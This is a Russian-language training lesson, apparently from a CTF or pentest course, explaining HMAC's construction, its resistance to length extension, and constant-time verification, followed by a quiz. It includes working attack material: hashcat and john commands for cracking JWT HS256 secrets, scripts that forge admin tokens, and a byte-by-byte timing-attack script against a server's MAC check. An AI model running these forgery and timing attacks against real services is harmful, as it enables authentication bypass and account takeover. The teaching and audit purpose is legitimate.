---
id: crypto-hmac
title: "HMAC: как он устроен и как его ломают (или нет)"
category: crypto
parent: crypto-hashing
difficulty: medium
order: 4
tags: [crypto, hmac, mac, keyed-hash, timing, length-extension, jwt]
prerequisites: [crypto-hashing]
useful_for:
  - "Понимать, почему HMAC устойчив к length-extension"
  - "Распознавать неправильные конструкции MAC"
  - "Атаковать HMAC через слабый ключ и timing"
estimated_minutes: 35
summary: "HMAC: конструкция ipad/opad, почему она защищает от length-extension, различия HMAC-MD5/SHA1/SHA256, атаки (слабый ключ, timing, утечки, неверные сравнения), HMAC в JWT и API-подписях. Практические скрипты."
---

## Зачем HMAC

Наивный MAC вида `H(secret || message)` уязвим к **length extension**: зная `H(secret || msg)` и длину секрета, атакующий достраивает сообщение и получает валидный MAC без знания секрета (см. `crypto-merkle`). HMAC (RFC 2104) — стандартная конструкция, которая решает эту проблему, используя хэш-функцию и ключ.

HMAC используется повсюду: JWT (HS256), API-подписи (AWS SigV4), TLS (PRF), webhook-верификация, PBKDF2, cookies с подписью.

## Конструкция

```
HMAC(K, m) = H((K' ⊕ opad) || H((K' ⊕ ipad) || m))
```

где:

- `K'` — ключ, дополненный/сжатый до размера блока хэша (например, 64 байта для SHA-256).
- `ipad = 0x36` повторённый до размера блока.
- `opad = 0x5C` повторённый до размера блока.

**Почему это работает:**

1. **Внешний хэш** финализирует результат — атакующий не может «продолжить» состояние, потому что финальный дайджест — это `H` от `(K'⊕opad) || внутренний_хэш`, а не внутреннее состояние Merkle–Damgård. Значит, length extension неприменим.
2. **Двойное использование ключа** (ipad/opad) разделяет внутренние и внешние вычисления.

Даже HMAC-MD5 (с «сломанным» MD5) остаётся стойким: коллизии MD5 не ломают HMAC-MD5 напрямую, потому что атакующий не контролирует внутреннее состояние (там секрет).

## Реализация и проверка

```python
import hmac, hashlib

key = b"secret-key"
msg = b"user=guest&role=user"
mac = hmac.new(key, msg, hashlib.sha256).hexdigest()
print(mac)

# constant-time проверка
valid = hmac.compare_digest(mac, received_mac)
```

Ключевое: сравнение **всегда** через `hmac.compare_digest`, а не `==`. Оператор `==` сравнивает побайтово с ранним выходом — утечка по времени позволяет побайтово подобрать MAC (timing attack).

## Атаки на HMAC

HMAC как конструкция стоек, но **применение** уязвимо:

1. **Слабый/короткий ключ.** JWT HS256 с секретом `secret` или `123456` ломается словарём:
   ```bash
   hashcat -m 16500 jwt.txt rockyou.txt       # JWT HS256
   ```
   Найдя секрет, атакующий подделывает любой токен.
2. **Timing attack при неверном сравнении.** Если сервер использует `==` вместо constant-time, MAC подбирается побайтово.
3. **Длина ключа и усечение.** Некоторые реализации принимают усечённый MAC (например, 8 байт) — снижает стойкость до `2^64`.
4. **Key reuse.** Один ключ для MAC и шифрования без разделения — опасно.
5. **Порядок аргументов.** `HMAC(K, m)` ≠ `HMAC(m, K)`; путаница даёт уязвимость (например, когда сообщение используется как ключ).
6. **HMAC vs «hash with key».** Если реализация — `H(K || m)` вместо HMAC, применим length extension.

## HMAC в JWT

JWT с `alg: HS256` подписывается `HMAC(secret, base64url(header) + "." + base64url(payload))`. Атаки:

- **Подбор секрета** (если слабый) → подделка токена.
- **`alg: none`** → если сервер принимает, подпись не проверяется (см. `crypto-jwt-crypto`).
- **Алгоритм-конфузия (RS256 → HS256):** публичный RSA-ключ используется как HMAC-секрет.

```python
import jwt
# подделка при известном секрете
token = jwt.encode({"user":"admin"}, "secret", algorithm="HS256")
```

## Практический пример: атака на самодельный токен

```python
# Сервер: mac = hmac.new(SECRET, msg, sha256).hexdigest(); сверяет через ==
# Атакуем timing: подбираем MAC побайтово по времени ответа
import requests, time
known = ""
for pos in range(64):
    best = None; best_t = 0
    for c in "0123456789abcdef":
        guess = known + c
        t0 = time.time()
        requests.get(url, params={"msg": msg, "mac": guess + "0"*(63-len(guess))})
        dt = time.time() - t0
        if dt > best_t:
            best_t, best = dt, c
    known += best
print("forged mac:", known)
```

Это демонстрация: неверное сравнение MAC → полный взлом подлинности.

## Инструменты и команды

```bash
pip install pyjwt hashpumpy
hashcat -m 16500 jwt.txt rockyou.txt      # JWT HS256
john --format=HMAC-SHA256 hashes.txt
# hashpump для length extension на H(secret||msg)
hashpump -s <sig> -d <data> -a <append> -k <keylen>
```

## Частые ошибки

- **Сравнение `==`.** Timing-утечка; нужен `compare_digest`.
- **Слабый ключ.** Словарь ломает JWT HS256.
- **`H(K||m)` вместо HMAC.** Length extension.
- **Усечённый MAC.** Снижает стойкость.
- **Один ключ для всего.** Разделяйте ключи по назначению.
- **`alg: none`/конфузия алгоритмов** в JWT.

## HMAC в реальных протоколах

- **TLS:** HMAC в PRF (для TLS ≤1.2), в AEAD-конструкциях — GHASH/Poly1305.
- **AWS SigV4:** подпись запросов HMAC-SHA256 с цепочкой ключей (date→region→service).
- **JWT HS256/384/512:** подпись HMAC.
- **IPsec/SSH:** HMAC для целостности пакетов.
- **PBKDF2:** HMAC как базовый примитив.
- **Webhook (GitHub, Stripe):** `X-Hub-Signature-256` = HMAC-SHA256 тела.

При аудите API: ищите слабый секрет, `H(K||m)` вместо HMAC, отсутствие проверки подписи, timing-сравнение.

## Атака: утечка через длину/ошибки

Некоторые реализации допускают **усечённый MAC** (например, первые 8 байт) — тогда стойкость падает до `2^64`, и возможен перебор подделки. Другая проблема — **ошибка в проверке**: если `verify` бросает исключение при неверной длине MAC, это может утекать информацию (аналог padding oracle). Всегда нормализуйте длину и сравнивайте constant-time.

## Разбор: подделка JWT HS256

```python
import jwt, hmac, hashlib, base64
# 1. Известен секрет (подобрали hashcat -m 16500)
secret = "secret"
# 2. Подделываем payload
token = jwt.encode({"user": "admin", "role": "admin"}, secret, algorithm="HS256")
print(token)
# 3. Используем как cookie/Authorization
```

```bash
# Подбор секрета JWT
hashcat -m 16500 jwt.txt rockyou.txt
john --format=HMAC-SHA256 jwt.txt --wordlist=rockyou.txt
```

## HMAC vs KMAC, GMAC, Poly1305

HMAC — не единственный MAC. Сравнение:

| MAC | Основа | Применение |
|---|---|---|
| HMAC | хэш | универсальный, TLS, JWT, AWS |
| CMAC | блочный шифр | AES-CCM, RFC 4493 |
| GMAC | GHASH | AES-GCM |
| Poly1305 | полином | ChaCha20-Poly1305 |
| KMAC | SHA-3 | новый стандарт NIST |

Все они дают целостность/подлинность; выбор зависит от доступных примитивов. HMAC — самый универсальный (нужен только хэш).

## Разбор: why HMAC не ломается length extension

Внутренний хэш `H((K⊕ipad)||m)` — это состояние, но оно передаётся как **данные** во внешний хэш, который начинается с секрета `(K⊕opad)`. Атакующий не может вычислить внешний хэш без знания `K`, и не может «продолжить» внутренний (потому что внешний начинается снова с секрета). Двойной проход — ключ к устойчивости.

## Аудит: где искать ошибки

- `H(key + msg)` вместо HMAC → length extension.
- `==` для сравнения MAC → timing.
- Слабый ключ (словарное слово) → подбор.
- Ключ из `random` вместо `secrets` → предсказуемость.
- Один ключ для MAC и шифрования → cross-protocol.
- `alg: none` / alg confusion в JWT.

## Разбор: JWT HS256 атака end-to-end

```python
import jwt, base64, json
# 1. Перехватываем токен
token = "eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZ3Vlc3QifQ.XXXX"
header = json.loads(base64.urlsafe_b64decode(token.split(".")[0] + "=="))
print(header)   # {'alg': 'HS256'}
# 2. Подбираем секрет (hashcat -m 16500) -> "secret"
# 3. Формируем поддельный токен
forged = jwt.encode({"user": "admin"}, "secret", algorithm="HS256")
print(forged)
```

## Разбор: timing-атака на MAC

Если сервер сравнивает MAC через `==`, время ответа зависит от числа совпавших байт. Подбираем побайтово:

```python
import time, requests
known = ""
for _ in range(64):
    best, bt = None, 0
    for c in "0123456789abcdef":
        t0 = time.time()
        requests.get(url, params={"mac": known + c + "0"*(63-len(known))})
        dt = time.time() - t0
        if dt > bt: bt, best = dt, c
    known += best
print("forged:", known)
```

## Как не застрять

- **Проверьте ключ.** Слабый → подбор (hashcat -m 16500).
- **Проверьте сравнение.** Не constant-time → timing.
- **Проверьте конструкцию.** `H(K||m)` → length extension.
- **Проверьте алгоритм.** `none`/RS256→HS256.
- **Для length extension** нужна длина ключа.
- **HMAC сам по себе стоек** — атакуйте применение.

## Квиз

```quiz
- question: "Чем HMAC отличается от `H(key || message)`?"
  options:
    - "ничем"
    - "устойчив к length-extension за счёт внешнего хэша и ipad/opad"
    - "быстрее"
    - "не использует ключ"
  answer: 1
- question: "Почему наивный `MAC = H(secret || msg)` опасен?"
  options:
    - "он слишком медленный"
    - "уязвим к атаке удлинением сообщения"
    - "не использует ключ"
    - "ломается XOR-ом"
  answer: 1
- question: "Как безопасно сравнивать MAC?"
  options:
    - "оператором `==`"
    - "`hmac.compare_digest` (постоянное время)"
    - "через `strcmp`"
    - "побайтово с early return"
  answer: 1
- question: "Какую атаку позволяет слабый секрет JWT HS256?"
  options:
    - "коллизию MD5"
    - "подбор секрета словарём и подделку подписи"
    - "length-extension"
    - "факторизацию"
  answer: 1
- question: "Что HMAC подтверждает?"
  options:
    - "только конфиденциальность"
    - "целостность и подлинность (владение ключом)"
    - "обратимость"
    - "факторизацию"
  answer: 1
```

## Где пригодится

- **CTF** — подделка API-токенов, JWT-секреты, length-extension.
- **Web-пентест** — HMAC в cookies, API-подписях, webhook-верификации.
- **Реверс/анализ API** — понимание схем подписи запросов (AWS SigV4, мобильные API).
- **Крипто-разработка** — правильная аутентификация сообщений.
- **Forensics** — проверка подлинности артефактов.
